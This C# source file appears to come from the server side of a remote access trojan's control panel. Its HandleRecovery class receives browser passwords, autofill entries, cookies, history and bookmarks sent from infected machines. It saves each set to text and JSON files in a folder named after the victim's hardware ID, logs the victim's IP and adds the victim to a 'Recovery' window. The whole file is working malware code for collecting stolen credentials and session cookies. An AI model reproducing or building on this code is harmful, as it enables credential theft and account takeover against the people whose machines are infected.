using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Forms;

namespace Server.Handle_Packet
{
    public class HandleRecovery
    {
        public HandleRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath = Path.Combine(Application.StartupPath, 
                    "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
                
                string pass = unpack_msgpack.ForcePathObject("password").AsString;
                string autofill = unpack_msgpack.ForcePathObject("autofill").AsString;
                string cookie = unpack_msgpack.ForcePathObject("cookie").AsString;
                string history = unpack_msgpack.ForcePathObject("history").AsString;
                string bookmark = unpack_msgpack.ForcePathObject("bookmark").AsString;

                if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
                string datestr = DateTime.Now.ToString("MM-dd-yyyy HH-mm-ss");

                File.WriteAllText($"{fullPath}\\Password.txt", pass);
                File.WriteAllText($"{fullPath}\\AutoFill.txt", autofill);
                File.WriteAllText($"{fullPath}\\Cookie.json", cookie);
                File.WriteAllText($"{fullPath}\\History.txt", history);
                File.WriteAllText($"{fullPath}\\BookMark.txt", bookmark);

                new HandleLogs().Addmsg($"Client {client.Ip} password recoveried success，file located @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Recovery", Color.Purple);
                client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                var recoveryform = (FromRecovery)Application.OpenForms["Recovery"];
                if (recoveryform != null) recoveryform.AddClient(client);
                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}